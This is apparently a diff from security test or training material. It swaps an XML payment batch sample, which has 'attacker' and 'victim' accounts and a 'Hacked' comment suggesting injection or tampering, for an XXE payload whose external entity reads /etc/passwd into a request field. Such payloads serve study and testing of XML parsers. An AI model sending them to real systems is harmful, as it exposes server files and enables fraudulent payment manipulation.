@@ -1,16 +1,7 @@
-<batchjob>
-  <payment>
-    <account>5678-attacker</account>
-    <rcpt>206-1234</rcpt>
-    <amount>100.00</amount>
-    <comment>
-    </comment>
-  </payment>
-  <payment>
-    <account>1234-victim</account>
-    <rcpt>206-1234</rcpt>
-    <amount>100.00</amount>
-    <comment>Hacked
-    </comment>
-  </payment>
-</batchjob>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE request [
+  <!ENTITY include SYSTEM "/etc/passwd">
+]>
+<request>
+  <description>&include;</description>
+</request>
